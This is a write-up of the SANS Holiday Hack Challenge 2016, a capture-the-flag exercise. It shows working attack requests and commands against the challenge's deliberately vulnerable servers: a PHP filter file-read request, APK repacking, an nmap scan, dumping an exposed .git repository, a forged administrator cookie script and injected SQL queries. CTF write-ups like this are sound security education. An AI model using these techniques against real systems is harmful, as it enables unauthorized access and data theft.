By using the Meteor Miner script, we see that there is a collection called **HomeQuotes**.
This can accessed by simply calling ```HomeQuotes.find().fetch()``` in my web-browser's javascript console.
And the url is located in the last object: **http://ads.northpolewonderland.com/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3**


### Uncaught Exception Handler

Here, we can use [PHP filter](https://pen-testing.sans.org/blog/2016/12/07/getting-moar-value-out-of-php-local-file-include-vulnerabilities) to try and extract information by reading the crash dump.
This can be achieved by performing the following request:

	POST /exception.php HTTP/1.1
	Host: ex.northpolewonderland.com
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Content-Type: application/json
	Connection: close
	Upgrade-Insecure-Requests: 1
	Content-Length: 124

	{
		"operation": "ReadCrashDump",
		"data": {
			"crashdump": "php://filter/convert.base64-encode/resource=exception"
		}
	}

Which will yield the following response:

	<?php
	 
	# Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3
	  
	# Code from http://thisinterestsme.com/receiving-json-post-data-via-php/
	# Make sure that it is a POST request.
	if(strcasecmp($_SERVER['REQUEST_METHOD'], 'POST') != 0){
	    die("Request method must be POST\n");
	}

### Debug Server

We have to enable debugging in the APK by using:

	apktool d SantaGram.apk
	vim res/values/strings.xml

And set false to true in the XML before repacking the APK:

	apktool b -f .SantaGram_4.2 -o heckd

Before we deploy the apk, we have to sign it:

	mkdir keys
	keytool -genkey -v -keystore keys/heckd.keystore -alias lol -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 10000
	jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore keys/hekd.keystore ./hekd.apk hekd

After deploying it and proxying through Burp, we get the following request:

	POST /index.php HTTP/1.1
	Content-Type: application/json
	User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0; Google Nexus 4 - 5.0.0 - API 21 - 768x1280_1 Build/LRX21M)
	Host: dev.northpolewonderland.com
	Connection: close
	Accept-Encoding: gzip
	Content-Length: 144

	{"date":"20161227224804-0500","udid":"8dce4456f734bf81","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":85719500}


Which get the following response:

	HTTP/1.1 200 OK
	Server: nginx/1.6.2
	Date: Wed, 28 Dec 2016 03:48:05 GMT
	Content-Type: application/json
	Connection: close
	Content-Length: 250

	{"date":"20161228034805","status":"OK","filename":"debug-20161228034805-0.txt","request":{"date":"20161227224804-0500","udid":"8dce4456f734bf81","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":85719500,"verbose":false}}

So, what if we try to set verbose to truein our next request? The we get some more information:

	HTTP/1.1 200 OK
	Server: nginx/1.6.2
	Date: Wed, 28 Dec 2016 03:51:32 GMT
	Content-Type: application/json
	Connection: close
	Content-Length: 719

	{"date":"20161228035132","date.len":14,"status":"OK","status.len":"2","filename":"debug-20161228035132-0.txt","filename.len":26,"request":{"date":"20161227224804-0500","udid":"8dce4456f734bf81","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":0,"verbose":true},"files":["debug-20161224235959-0.mp3","debug-20161228033632-0.txt","debug-20161228033648-0.txt","debug-20161228033732-0.txt","debug-20161228033753-0.txt","debug-20161228033818-0.txt","debug-20161228034635-0.txt","debug-20161228034805-0.txt","debug-20161228034916-0.txt","debug-20161228035048-0.txt","debug-20161228035050-0.txt","debug-20161228035052-0.txt","debug-20161228035122-0.txt","debug-20161228035132-0.txt","index.php"]}

In the files array, we see different files, and among them, an audio file.

### Mobile Analytics - credentialed login

We use the credetials we found in the APK; username **guest** and password **busyreindeer78**, and simply click the **MP3** link in the navigation bar.
Then we get access to an audio file named discombobulatedaudio2.mp3.

### Mobile Analytics - post authentication

First we nmap the server:

	❯ nmap -sC 104.198.252.157
	Starting Nmap 7.40 ( https://nmap.org ) at 2017-01-05 05:09 CET
	Nmap scan report for 157.252.198.104.bc.googleusercontent.com (104.198.252.157)
	Host is up (0.20s latency).
	Not shown: 998 filtered ports
	PORT    STATE SERVICE
	22/tcp  open  ssh
	| ssh-hostkey: 
	|   1024 5d:5c:37:9c:67:c2:40:94:b0:0c:80:63:d4:ea:80:ae (DSA)
	|   2048 f2:25:e1:9f:ff:fd:e3:6e:94:c6:76:fb:71:01:e3:eb (RSA)
	|_  256 4c:04:e4:25:7f:a1:0b:8c:12:3c:58:32:0f:dc:51:bd (ECDSA)
	443/tcp open  https
	| http-git: 
	|   104.198.252.157:443/.git/
	|     Git repository found!
	|     Repository description: Unnamed repository; edit this file 'description' to name the...
	|_    Last commit message: Finishing touches (style, css, etc) 
	| http-title: Sprusage Usage Reporter!
	|_Requested resource was login.php
	| ssl-cert: Subject: commonName=analytics.northpolewonderland.com
	| Subject Alternative Name: DNS:analytics.northpolewonderland.com
	| Not valid before: 2016-12-07T17:35:00
	|_Not valid after:  2017-03-07T17:35:00
	|_ssl-date: TLS randomness does not represent time
	| tls-nextprotoneg: 
	|_  http/1.1


And get that there is a git repository there, so we download it, and restore the deleted files:

	❯ wget -r --no-parent https://analytics.northpolewonderland.com/.git/
	❯ cd analytics.northpolewonderland.com 
	❯ git checkout -- .

We see that edit.php is only accessible for the administrator user, but the code for generating the cookies is also available for us, so we can create our own:

	<?php

		define('KEY', "\x61\x17\xa4\x95\xbf\x3d\xd7\xcd\x2e\x0d\x8b\xcb\x9f\x79\xe1\xdc");

		function decrypt($data) {
			return mcrypt_decrypt(MCRYPT_ARCFOUR, KEY, $data, 'stream');
		}
		function encrypt($data) {
			return mcrypt_encrypt(MCRYPT_ARCFOUR, KEY, $data, 'stream');
		}

		$cookie = "82532b2136348aaa1fa7dd2243da1cc9fb13037c49259e5ed70768d4e9baa1c80b97fee8bca82880fc78ba78c49e0753b14348637bec";
		$kake = json_decode(decrypt(pack("H*",$cookie)), true);
		var_dump($kake);
		$shit['username'] = "administrator";
		var_dump($kake);
		$torsk = bin2hex(encrypt(json_encode($kake)));
		print $torsk;
	?>

And that cookie can then be used to gain administrator privilegies, and thus acces the edit page.

We see that we can update a report, but not set the query because it is not in the html. But the can intercept the request, add the query parameter with the value equal to:

	SELECT * FROM `audio`;

Now, we access the report via view.php, and we get two files listed:

id	username	filename	mp3
20c216bc-b8b1-11e6-89e1-42010af00008	guest	discombobulatedaudio2.mp3	 
3746d987-b8b1-11e6-89e1-42010af00008	administrator	discombobulatedaudio7.mp3	 

The actual MP3 is a field, but because it is not possilbe to render the octet stream that is the MP3 file as printable text, we have to use another trick, namely base64, which is supported by the dbms, and we change the query to:

	SELECT filename, TO_BASE64(mp3) FROM `audio`;

Then go to the view, copy the base64-encoded mp3 and decode it.


## 8) What are the names of the audio files you discovered from each system above?

The following audio files originate from the following sources:

- SantaGram APK: **discombobulatedaudio1.mp3**
- Mobile Analytics credentials: **discombobulatedaudio2.mp3**
- Dungeon: **discombobulatedaudio3.mp3**
- Debug Server: **debug-20161224235959-0.mp3**
- Banner Ad Server: **discombobulatedaudio5.mp3**
- Uncaught Exception Handler: **discombobulated-audio-6-XyzE3N9YqKNH.mp3**
- Mobile Analytics post auth: **discombobulatedaudio7.mp3**


# Part 5: Discombobulated Audio 

## 9) Who is the villain behind the nefarious plot. 

We start by chaining the audio files together, ordered acording to their numbering.
But that is not enough; so we have to tweak the sound, both in terms of speed and pitch.
After some tweaking, we hear a voice saying: ```Father Christmas, Santa Claus. Or, as I've always known him, Jeff.```

Googling this phrase refer us to a christmas episode of **Doctor Who**. Does this mean that **Who** abducted Santa, literally?
The TARDIS on Santa's desk suddenly make much more sense now.

**Doctor Who** is the villain behind the nefarious plot; but why?


## 10) Why had the villain abducted Santa? 

If we use this passphrase on the door in the corridor behind Santa's bookshelf, if will unlock.
Up at the top, we find none else than **Doctor Who**, which confirm that he was the one that abducted Santa.
He also justifies it by trying to stop the Star Wars Holiday Special from ever being released, and abducting Santa and using his North Pole Wonderland Magick could prevent it from being released.

# Epilogue

Thank you for the great Holiday Hack Challenge. I really had a blast, and think that the vast majority did.
Kudos to the entire team behind Holiday Hack Challenge, and a happy new year!
